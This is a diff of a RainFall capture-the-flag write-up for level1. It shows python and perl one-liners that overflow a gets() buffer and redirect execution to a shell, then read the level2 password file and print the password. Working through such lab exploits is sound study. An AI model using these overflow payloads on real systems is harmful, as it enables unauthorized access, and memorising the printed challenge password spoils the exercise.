@@ -39,6 +39,7 @@ End of assembler dump.
 We can see here the binary calls the C function ```gets```, which copies a string from stdin to a buffer. 
 Let's see if we can cause a buffer overflow. A buffer overflow allows us to change the flow of execution of the program.
 ```
+level1@RainFall:~$ python -c 'print "a"*76' | ./level1
 level1@RainFall:~$ perl -E "print '*' x 76" | ./level1
 Illegal instruction (core dumped)
 ```
@@ -60,15 +61,13 @@ https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbi
 
 ```
 level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+level1@RainFall:~$ (perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' ; cat -) | ./level1
 Good... Wait what?
 whoami
 level2
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
-
-
-(python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
-(perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' ; cat -) | ./level1
+So the password for level2 is ```53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77```!
 
 ## Recreate Exploited Binary
